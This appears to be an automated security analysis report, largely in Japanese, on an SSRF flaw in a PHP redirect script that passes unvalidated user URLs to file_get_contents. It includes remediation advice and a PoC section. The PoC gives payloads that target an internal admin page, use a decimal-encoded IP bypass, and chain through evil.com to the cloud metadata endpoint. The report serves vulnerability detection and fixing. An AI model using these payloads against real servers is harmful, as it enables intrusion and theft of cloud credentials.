# Analysis Report

![高信頼度](https://img.shields.io/badge/信頼度-高-red) **信頼度スコア: 90**

## 脆弱性タイプ

- `SSRF`
- `SSRF`

## PAR Policy Analysis

### Principals (データ源)

- **$_GET['url']**: Untrusted
  - Context: HTTPリクエスト
  - Risk Factors: 未検証の外部入力

### Actions (セキュリティ制御)

- **SSRF**: Missing
  - Function: URLバリデーション
  - Weaknesses: 入力値検証なし, 外部リクエスト可能
  - Bypass Vectors: DNS rebinding, IP address encoding tricks, Redirect chain

### Resources (操作対象)

- **file_get_contents**: High
  - Operation: HTTP(S)リクエスト
  - Protection: 

## 詳細解析

このコードはユーザーから渡されたURLを検証なしにfile_get_contentsで取得しており、SSRF攻撃が可能です。外部・内部ネットワークの任意ホストへリクエストを送信でき、DNS rebindingやIPアドレスのエンコーディング、リダイレクトチェーンによるバイパスも可能です。

## PoC（概念実証コード）

```text
1. 内部UI参照
http://example.com/redirect.php?url=http://127.0.0.1:8080/admin

2. IPエンコーディングバイパス
http://example.com/redirect.php?url=http://2130706433

3. リダイレクトチェーン利用
http://example.com/redirect.php?url=http://evil.com/chain?target=http://169.254.169.254/latest/meta-data
```

## 修復ガイダンス

### 入力バリデーション

- **Required**: ホワイトリスト方式のURL検証を実装
- **Guidance**: 受信可能なドメインやIPレンジを厳格に制限し、リダイレクト先のチェーン解析も行う
- **Priority**: high

## 解析ノート

ユーザー入力がそのままfile_get_contentsへ渡されており、外部だけでなく内部IPやメタデータサーバへのアクセスも可能。バイパス想定としてDNSリバインディング、IPエンコーディング、リダイレクトチェーンを検討。パリティモデルではPrincipalは$_GET['url']（untrusted）、Resourceはfile_get_contentsによるHTTPリクエスト（high）。Actionに検証がないためpolicy violationを検出。

